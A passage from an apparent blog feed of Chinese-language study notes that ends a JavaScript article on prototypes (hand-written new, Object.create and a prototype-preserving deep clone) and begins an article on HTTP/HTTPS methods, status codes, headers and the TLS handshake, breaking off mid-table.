class="hljs-title class_ inherited__">Parent</span> &#123;&#125;<br><br><span class="hljs-keyword">const</span> child = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Child</span>();<br>child[parentSymbol](); <span class="hljs-comment">// &quot;Parent symbol method&quot;</span><br><br><span class="hljs-comment">// 检查继承关系</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<br>  <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">getOwnPropertySymbols</span>(<span class="hljs-title class_">Parent</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>).<span class="hljs-title function_">includes</span>(parentSymbol)<br>); <span class="hljs-comment">// true</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<br>  <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">getOwnPropertySymbols</span>(<span class="hljs-title class_">Child</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>).<span class="hljs-title function_">includes</span>(parentSymbol)<br>); <span class="hljs-comment">// false（继承而非自有）</span><br></code></pre></td></tr></table></figure><h1 id="第十章：实战与面试题解析"><a href="#第十章：实战与面试题解析" class="headerlink" title="第十章：实战与面试题解析"></a>第十章：实战与面试题解析</h1><h2 id="10-1-手写-new-操作符实现"><a href="#10-1-手写-new-操作符实现" class="headerlink" title="10.1 手写 new 操作符实现"></a>10.1 手写 <code>new</code> 操作符实现</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">myNew</span>(<span class="hljs-params">Constructor, ...args</span>) &#123;<br>  <span class="hljs-comment">// 验证输入</span><br>  <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> <span class="hljs-title class_">Constructor</span> !== <span class="hljs-string">&#x27;function&#x27;</span>) &#123;<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TypeError</span>(<span class="hljs-string">&#x27;First argument must be a function&#x27;</span>);<br>  &#125;<br>  <br>  <span class="hljs-comment">// 创建新对象并设置原型</span><br>  <span class="hljs-keyword">const</span> obj = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(<span class="hljs-title class_">Constructor</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>);<br>  <br>  <span class="hljs-comment">// 执行构造函数</span><br>  <span class="hljs-keyword">const</span> result = <span class="hljs-title class_">Constructor</span>.<span class="hljs-title function_">apply</span>(obj, args);<br>  <br>  <span class="hljs-comment">// 处理返回值</span><br>  <span class="hljs-keyword">return</span> (result &amp;&amp; (<span class="hljs-keyword">typeof</span> result === <span class="hljs-string">&#x27;object&#x27;</span> || <span class="hljs-keyword">typeof</span> result === <span class="hljs-string">&#x27;function&#x27;</span>))<br>    ? result <br>    : obj;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="10-2-手写-Object-create"><a href="#10-2-手写-Object-create" class="headerlink" title="10.2 手写 Object.create"></a>10.2 手写 <code>Object.create</code></h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">myObjectCreate</span>(<span class="hljs-params">proto</span>) &#123;<br>  <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> proto !== <span class="hljs-string">&#x27;object&#x27;</span> &amp;&amp; <span class="hljs-keyword">typeof</span> proto !== <span class="hljs-string">&#x27;function&#x27;</span> &amp;&amp; proto !== <span class="hljs-literal">null</span>) &#123;<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TypeError</span>(<span class="hljs-string">&#x27;Object prototype may only be an Object or null&#x27;</span>);<br>  &#125;<br>  <br>  <span class="hljs-keyword">function</span> <span class="hljs-title function_">F</span>(<span class="hljs-params"></span>) &#123;&#125;<br>  F.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span> = proto;<br>  <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title function_">F</span>();<br>&#125;<br></code></pre></td></tr></table></figure><p>使用示例：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> parent = &#123; <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;Parent&#x27;</span> &#125;;<br><span class="hljs-keyword">const</span> child = <span class="hljs-title function_">myObjectCreate</span>(parent);<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(child.<span class="hljs-property">name</span>); <span class="hljs-comment">// &#x27;Parent&#x27;</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Object</span>.<span class="hljs-title function_">getPrototypeOf</span>(child) === parent); <span class="hljs-comment">// true</span><br></code></pre></td></tr></table></figure><h2 id="10-3-如何实现一个完美的深拷贝（处理原型链）"><a href="#10-3-如何实现一个完美的深拷贝（处理原型链）" class="headerlink" title="10.3 如何实现一个完美的深拷贝（处理原型链）"></a>10.3 如何实现一个完美的深拷贝（处理原型链）</h2><p><strong>完整代码</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">deepClone</span>(<span class="hljs-params">source, map = <span class="hljs-keyword">new</span> <span class="hljs-built_in">WeakMap</span>()</span>) &#123;<br>  <span class="hljs-comment">// 处理基本类型和函数</span><br>  <span class="hljs-keyword">if</span> (source === <span class="hljs-literal">null</span> || <span class="hljs-keyword">typeof</span> source !== <span class="hljs-string">&#x27;object&#x27;</span>) &#123;<br>    <span class="hljs-keyword">return</span> source;<br>  &#125;<br><br>  <span class="hljs-comment">// 处理循环引用</span><br>  <span class="hljs-keyword">if</span> (map.<span class="hljs-title function_">has</span>(source)) &#123;<br>    <span class="hljs-keyword">return</span> map.<span class="hljs-title function_">get</span>(source);<br>  &#125;<br><br>  <span class="hljs-comment">// 获取原型</span><br>  <span class="hljs-keyword">const</span> proto = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">getPrototypeOf</span>(source);<br>  <br>  <span class="hljs-comment">// 处理特殊对象类型</span><br>  <span class="hljs-keyword">if</span> (source <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Date</span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>(source);<br>  &#125;<br>  <br>  <span class="hljs-keyword">if</span> (source <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">RegExp</span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RegExp</span>(source);<br>  &#125;<br>  <br>  <span class="hljs-keyword">if</span> (source <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Map</span>) &#123;<br>    <span class="hljs-keyword">const</span> cloneMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>();<br>    map.<span class="hljs-title function_">set</span>(source, cloneMap);<br>    source.<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">value, key</span>) =&gt;</span> &#123;<br>      cloneMap.<span class="hljs-title function_">set</span>(<span class="hljs-title function_">deepClone</span>(key, map), <span class="hljs-title function_">deepClone</span>(value, map));<br>    &#125;);<br>    <span class="hljs-keyword">return</span> cloneMap;<br>  &#125;<br>  <br>  <span class="hljs-keyword">if</span> (source <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Set</span>) &#123;<br>    <span class="hljs-keyword">const</span> cloneSet = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Set</span>();<br>    map.<span class="hljs-title function_">set</span>(source, cloneSet);<br>    source.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">value</span> =&gt;</span> &#123;<br>      cloneSet.<span class="hljs-title function_">add</span>(<span class="hljs-title function_">deepClone</span>(value, map));<br>    &#125;);<br>    <span class="hljs-keyword">return</span> cloneSet;<br>  &#125;<br>  <br>  <span class="hljs-keyword">if</span> (source <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">ArrayBuffer</span>) &#123;<br>    <span class="hljs-keyword">return</span> source.<span class="hljs-title function_">slice</span>(<span class="hljs-number">0</span>);<br>  &#125;<br>  <br>  <span class="hljs-keyword">if</span> (<span class="hljs-title class_">ArrayBuffer</span>.<span class="hljs-title function_">isView</span>(source)) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> source.<span class="hljs-title function_">constructor</span>(<span class="hljs-params"></span><br><span class="hljs-params">      source.buffer.slice(<span class="hljs-number">0</span>),</span><br><span class="hljs-params">      source.byteOffset,</span><br><span class="hljs-params">      source.byteLength</span><br><span class="hljs-params">    </span>);<br>  &#125;<br><br>  <span class="hljs-comment">// 创建目标对象并保留原型链</span><br>  <span class="hljs-keyword">let</span> target;<br>  <span class="hljs-keyword">if</span> (<span class="hljs-title class_">Array</span>.<span class="hljs-title function_">isArray</span>(source)) &#123;<br>    target = <span class="hljs-keyword">new</span> proto.<span class="hljs-title function_">constructor</span>(<span class="hljs-params">source.length</span>);<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    target = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(proto);<br>  &#125;<br>  <br>  <span class="hljs-comment">// 记录已拷贝对象</span><br>  map.<span class="hljs-title function_">set</span>(source, target);<br><br>  <span class="hljs-comment">// 处理Symbol属性</span><br>  <span class="hljs-keyword">const</span> symbolKeys = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">getOwnPropertySymbols</span>(source);<br>  <span class="hljs-keyword">const</span> allKeys = [...<span class="hljs-title class_">Object</span>.<span class="hljs-title function_">keys</span>(source), ...symbolKeys];<br>  <br>  <span class="hljs-comment">// 递归拷贝所有属性</span><br>  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> key <span class="hljs-keyword">of</span> allKeys) &#123;<br>    <span class="hljs-comment">// 跳过原型属性</span><br>    <span class="hljs-keyword">if</span> (!source.<span class="hljs-title function_">hasOwnProperty</span>(key)) <span class="hljs-keyword">continue</span>;<br>    <br>    <span class="hljs-comment">// 处理属性描述符</span><br>    <span class="hljs-keyword">const</span> descriptor = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">getOwnPropertyDescriptor</span>(source, key);<br>    <span class="hljs-keyword">if</span> (descriptor &amp;&amp; !descriptor.<span class="hljs-property">enumerable</span>) <span class="hljs-keyword">continue</span>;<br>    <br>    target[key] = <span class="hljs-title function_">deepClone</span>(source[key], map);<br>  &#125;<br>  <br>  <span class="hljs-keyword">return</span> target;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>使用示例</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 测试原型链保持</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">Person</span>(<span class="hljs-params">name</span>) &#123;<br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;<br>&#125;<br><span class="hljs-title class_">Person</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">greet</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-string">`Hello, <span class="hljs-subst">$&#123;<span class="hljs-variable language_">this</span>.name&#125;</span>`</span>;<br>&#125;;<br><br><span class="hljs-keyword">const</span> person = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&#x27;Alice&#x27;</span>);<br><span class="hljs-keyword">const</span> clonedPerson = <span class="hljs-title function_">deepClone</span>(person);<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(person.<span class="hljs-title function_">greet</span>()); <span class="hljs-comment">// &quot;Hello, Alice&quot;</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(clonedPerson.<span class="hljs-title function_">greet</span>()); <span class="hljs-comment">// &quot;Hello, Alice&quot;</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Object</span>.<span class="hljs-title function_">getPrototypeOf</span>(clonedPerson) === <span class="hljs-title class_">Person</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>); <span class="hljs-comment">// true</span><br><br><span class="hljs-comment">// 测试循环引用</span><br><span class="hljs-keyword">const</span> obj = &#123; <span class="hljs-attr">a</span>: <span class="hljs-number">1</span> &#125;;<br>obj.<span class="hljs-property">self</span> = obj;<br><span class="hljs-keyword">const</span> clonedObj = <span class="hljs-title function_">deepClone</span>(obj);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(clonedObj.<span class="hljs-property">self</span> === clonedObj); <span class="hljs-comment">// true</span><br><br><span class="hljs-comment">// 测试特殊对象</span><br><span class="hljs-keyword">const</span> map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>([[<span class="hljs-string">&#x27;key&#x27;</span>, <span class="hljs-string">&#x27;value&#x27;</span>]]);<br><span class="hljs-keyword">const</span> clonedMap = <span class="hljs-title function_">deepClone</span>(map);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(clonedMap.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;key&#x27;</span>)); <span class="hljs-comment">// &#x27;value&#x27;</span><br><br><span class="hljs-keyword">const</span> date = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>();<br><span class="hljs-keyword">const</span> clonedDate = <span class="hljs-title function_">deepClone</span>(date);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(clonedDate.<span class="hljs-title function_">getTime</span>() === date.<span class="hljs-title function_">getTime</span>()); <span class="hljs-comment">// true</span><br></code></pre></td></tr></table></figure><p><strong>关键特性</strong></p><ul><li>原型链保留：<ul><li>使用 Object.create(proto) 创建对象</li><li>保持原型链不变</li></ul></li><li>循环引用处理：<ul><li>使用 WeakMap 跟踪已拷贝对象</li><li>避免无限递归</li></ul></li><li>全面类型支持：<ul><li>基本类型</li><li>对象&#x2F;数组</li><li>函数（直接引用）</li><li>Date&#x2F;RegExp</li><li>Map&#x2F;Set</li><li>ArrayBuffer&#x2F;TypedArray</li><li>Symbol 属性</li></ul></li><li>属性描述符处理：<ul><li>跳过不可枚举属性</li><li>保留属性特性</li></ul></li><li>性能优化：<ul><li>使用 WeakMap 避免内存泄漏</li><li>最小化属性遍历</li></ul></li></ul>]]></content>
    
    
    <categories>
      
      <category>JavaScript</category>
      
    </categories>
    
    
    <tags>
      
      <tag>JavaScript</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>网络知识专题学习</title>
    <link href="/2025/06/20/Network%20Study%20Notes/"/>
    <url>/2025/06/20/Network%20Study%20Notes/</url>
    
    <content type="html"><![CDATA[<h1 id="一、基础网络协议"><a href="#一、基础网络协议" class="headerlink" title="一、基础网络协议"></a>一、基础网络协议</h1><h2 id="1-1-HTTP-HTTPS协议核心"><a href="#1-1-HTTP-HTTPS协议核心" class="headerlink" title="1.1 HTTP&#x2F;HTTPS协议核心"></a>1.1 HTTP&#x2F;HTTPS协议核心</h2><h3 id="HTTP协议"><a href="#HTTP协议" class="headerlink" title="HTTP协议"></a>HTTP协议</h3><p><strong>定义</strong></p><p>HTTP（HyperText Transfer Protocol）是应用层协议，基于 请求-响应 模型，用于客户端（浏览器）与服务器之间的数据传输，默认端口 80</p><p><strong>核心特性</strong></p><ul><li>无状态：每个请求独立，服务器不保留客户端上下文（状态管理依赖 Cookie 和 Session）</li><li>明文传输：请求与响应内容以未加密的文本形式传输</li><li>常用方法：<ul><li>GET：获取资源</li><li>POST：提交数据</li><li>PUT：更新资源</li><li>DELETE：删除资源</li></ul></li></ul><span id="more"></span><p><strong>报文结构</strong></p><p>请求报文：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs Text">GET /index.html HTTP/1.1<br>Host: www.example.com<br>User-Agent: Mozilla/5.0<br></code></pre></td></tr></table></figure><p>响应报文：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs Text">HTTP/1.1 200 OK<br>Content-Type: text/html<br>&lt;html&gt;...&lt;/html&gt;<br></code></pre></td></tr></table></figure><h3 id="HTTPS协议"><a href="#HTTPS协议" class="headerlink" title="HTTPS协议"></a>HTTPS协议</h3><p><strong>定义</strong></p><p>HTTPS（HTTP secure）&#x3D; HTTP + TSL&#x2F;SSL 加密层，在传输层对 HTTP 数据进行加密，默认端口 443</p><p><strong>核心机制</strong></p><p>加密原理：</p><ul><li>非对称加密：使用公钥&#x2F;私钥对协商会话密钥（如 RSA 算法）</li><li>对称加密：后续通信使用协商的会话密钥高效加密数据（如 AES 算法）</li></ul><p>身份验证：依赖数字证书（由 CA 颁发）验证服务器身份，防止中间人攻击</p><p><strong>工作流程</strong></p><ol><li>客户端发起 HTTPS 请求（clienthello）</li><li>服务器返回数字证书（含公钥）</li><li>客户端验证证书有效性（CA 链、有效期等）</li><li>客户端生成会话密钥，用公钥加密后发送给服务器</li><li>双方使用会话密钥进行对称加密通信</li></ol><p><strong>核心优势</strong></p><ul><li>数据保密：加密传输，防窃听</li><li>数据完整：防篡改（MAC 校验）</li><li>身份认证：验证服务器真实性</li></ul><h3 id="HTTP请求方法（GET-POST-PUT-DELETE）与状态码（200-301-404-500）"><a href="#HTTP请求方法（GET-POST-PUT-DELETE）与状态码（200-301-404-500）" class="headerlink" title="HTTP请求方法（GET&#x2F;POST&#x2F;PUT&#x2F;DELETE）与状态码（200&#x2F;301&#x2F;404&#x2F;500）"></a>HTTP请求方法（GET&#x2F;POST&#x2F;PUT&#x2F;DELETE）与状态码（200&#x2F;301&#x2F;404&#x2F;500）</h3><p><strong>HTTP 请求方法</strong></p><table><thead><tr><th align="left">方法</th><th align="left">核心特性</th><th align="left">典型应用场景</th><th align="left">幂等性</th><th align="left">安全性</th></tr></thead><tbody><tr><td align="left">GET</td><td align="left">从服务器获取资源，参数通过URL传递（长度受限）</td><td align="left">加载页面、查询数据</td><td align="left">是</td><td align="left">是</td></tr><tr><td align="left">POST</td><td align="left">向服务器提交数据（请求体承载数据），可能修改服务器状态</td><td align="left">表单提交、文件上传、登录操作</td><td align="left">否</td><td align="left">否</td></tr><tr><td align="left">PUT</td><td align="left">完整更新服务器资源（需提交完整新数据）</td><td align="left">更新用户资料、替换整个文档</td><td align="left">是</td><td align="left">否</td></tr><tr><td align="left">DELETE</td><td align="left">删除服务器指定资源</td><td align="left">删除文章、移除用户账户</td><td align="left">是</td><td align="left">否</td></tr></tbody></table><ul><li>幂等性：多次相同请求效果 &#x3D; 一次请求（GET&#x2F;PUT&#x2F;DELETE 是，POST 不是）</li><li>安全性：是否修改服务器资源（仅 GET 是安全的）</li></ul><p><strong>HTTP 状态码</strong></p><table><thead><tr><th align="left">状态码</th><th align="left">类别</th><th align="left">核心含义</th><th align="left">典型触发场景</th></tr></thead><tbody><tr><td align="left">200</td><td align="left">成功 (2xx)</td><td align="left">OK - 请求成功处理</td><td align="left">页面正常加载、API返回有效数据</td></tr><tr><td align="left">301</td><td align="left">重定向 (3xx)</td><td align="left">Moved Permanently - 资源永久迁移（浏览器自动缓存新地址）</td><td align="left">网站域名变更、旧URL废弃（SEO权重转移）</td></tr><tr><td align="left">404</td><td align="left">客户端错误(4xx)</td><td align="left">Not Found - 请求资源不存在</td><td align="left">URL路径错误、静态资源被删除</td></tr><tr><td align="left">500</td><td align="left">服务器错误(5xx)</td><td align="left">Internal Server Error - 服务器内部处理失败</td><td align="left">后端代码异常、数据库连接故障</td></tr></tbody></table><h3 id="HTTP报文结构（请求行、请求头、请求体）"><a href="#HTTP报文结构（请求行、请求头、请求体）" class="headerlink" title="HTTP报文结构（请求行、请求头、请求体）"></a>HTTP报文结构（请求行、请求头、请求体）</h3><p><strong>请求报文结构</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs Text">[请求行]<br>[请求头]<br>[空行]<br>[请求体]<br></code></pre></td></tr></table></figure><p><strong>请求行（Request Line）</strong></p><ul><li>格式：<code>[方法] [URL路径] [协议版本]</code>（<code>GET /index.html HTTP/1.1</code>）</li><li>核心要素：<ul><li>方法：<code>GET/POST/PUT/DELETE</code>等</li><li>URL 路径：资源路径，不包含域名</li><li>协议版本：<code>HTTP/1.1</code> 或 <code>HTTP/2</code></li></ul></li></ul><p><strong>请求头（Request Headers）</strong></p><ul><li>格式：<code>Header-Name: value</code>（<code>Host: www.example.com</code>）</li><li>关键字段：<ul><li>HOST：目标域名（HTTP&#x2F;1.1 必需）</li><li>User-Agent：客户端标识</li><li>Content-type：请求媒体类型</li><li>Cookie：会话状态</li></ul></li></ul><p><strong>请求体（Request Body）</strong></p><ul><li>位置：空行之后</li><li>内容：<ul><li>GET 请求通常无请求体</li><li>POST&#x2F;PUT 请求包含数据</li></ul><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs JSON"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;username&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;admin&quot;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure></li><li>格式依赖：由 <code>Content-Type</code> 请求头指定</li></ul><p><strong>响应报文结构</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs Text">[状态行]<br>[响应头]<br>[空行]<br>[响应体]<br></code></pre></td></tr></table></figure><p><strong>状态行（Status Line）</strong></p><ul><li>格式：<code>[协议版本] [状态码] [状态文本]</code>（<code>HTTP/1.1 200 OK</code>）</li></ul><p><strong>响应头（Response Headers）</strong></p><ul><li>格式：<code>Header-Name: value</code>（<code>Cache-Control: nocache</code>）</li><li>关键字段：<ul><li>Content-type：响应体类型（如 text&#x2F;html）</li><li>Cache-Control：缓存策略</li><li>Set-Cookie：会话状态</li></ul></li></ul><p><strong>响应体（Response Body）</strong></p><ul><li>内容：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs HTML">&lt;html&gt;...&lt;/html&gt;<br></code></pre></td></tr></table></figure><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs JSON"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;data&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;value&quot;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><h3 id="请求-响应头结构（Content-Type-Cache-Control-Authorization）"><a href="#请求-响应头结构（Content-Type-Cache-Control-Authorization）" class="headerlink" title="请求&#x2F;响应头结构（Content-Type&#x2F;Cache-Control&#x2F;Authorization）"></a>请求&#x2F;响应头结构（Content-Type&#x2F;Cache-Control&#x2F;Authorization）</h3><p><strong>HTTP 头部核心结构</strong></p><p>HTTP 头是键值对集合（不区分大小写），位于请求&#x2F;响应报文起始行之后，空行之前，格式如下：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Text">Header-Name: value1, value2<br></code></pre></td></tr></table></figure><p><strong>核心请求&#x2F;响应头详解</strong></p><p>（1）content-Type</p><ul><li>作用：设置请求&#x2F;响应主体的媒体类型（MIME 类型）和编码格式</li><li>请求头示例：Content-Type: application&#x2F;json; charset&#x3D;utf-8<ul><li>application&#x2F;json：JSON 格式数据</li><li>charset&#x3D;utf-8：字符编码</li></ul></li><li>响应头示例：Content-Type: text&#x2F;html; charset&#x3D;UTF-8</li><li>前端关键场景：<ul><li>提交表单时需设置：application&#x2F;x-www-form-urlencoded（默认）或multipart&#x2F;form-data（文件上传）</li><li>调用 API 时需与服务端协商：application&#x2F;json（RESTful API 规范）</li></ul></li></ul><p>（2）Cache-Control</p><ul><li>作用：控制资源的缓存机制（请求&#x2F;响应中均可使用），优先级高于 <code>Expires</code></li><li>常用指令：</li></ul><table><thead><tr><th align="left">指令</th><th align="left">请求头用途</th><th align="left">响应头用途</th></tr></thead><tbody><tr><td align="left">max-age&#x3D;3600</td><td align="left">-</td><td align="left">资源有效期（秒）</td></tr><tr><td align="left">no-cache</td><td align="left">要求服务器验证缓存有效性</td><td align="left">允许缓存但每次需验证</td></tr><tr><td align="left">no-store</td><td align="left">禁止任何缓存</td><td align="left">禁止任何缓存</td></tr><tr><td align="left">public</td><td align="left">-</td><td align="left">允许所有环境缓存（CDN&#x2F;代理）</td></tr><tr><td align="left">private</td><td align="left">-</td><td align="left">仅允许浏览器缓存</td></tr></tbody></table><ul><li>前端优化实践：</li></ul><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs Text"># 静态资源长期缓存<br>Cache-Control: public, max-age=31536000, immutable<br></code></pre></td></tr></table></figure><p>（3）Authorization</p><ul><li>作用：在请求头中携带客户端身份凭证，用于访问受保护资源</li><li>典型格式：<code>Authorization: &lt;认证类型&gt; &lt;凭证&gt;</code><ul><li>Bearer Token（JWT标准）：<code>Authorization: Bearer eyJhbGci...</code></li><li>Basic Auth：<code>Authorization: Basic base64(username:password)</code></li></ul></li><li>安全要求：<ul><li>必须通过 HTTPS 传输（防止凭证泄露）</li><li>前端存储敏感凭证需使用 <code>HttpOnly Cookie</code> 或安全存储（Secure Storage）</li></ul></li></ul><h3 id="HTTPS加密原理（SSL-TLS握手、证书验证）"><a href="#HTTPS加密原理（SSL-TLS握手、证书验证）" class="headerlink" title="HTTPS加密原理（SSL&#x2F;TLS握手、证书验证）"></a>HTTPS加密原理（SSL&#x2F;TLS握手、证书验证）</h3><p><strong>核心原理</strong></p><p>本质是 HTTP + TLS&#x2F;SSL 加密层（传输层安全协议），通过混合加密体系保障安全</p><p><strong>TLS&#x2F;SSL 握手过程</strong></p><table><thead><tr><th align="left">步骤</th><th align="left">关键动作</th><th align="left">加密技术应用</th></tr></thead><tbody><tr><td align="left">ClientHello</td><td align="left">客户端发送：支持的 TLS 版本 + 加密套件列表 + 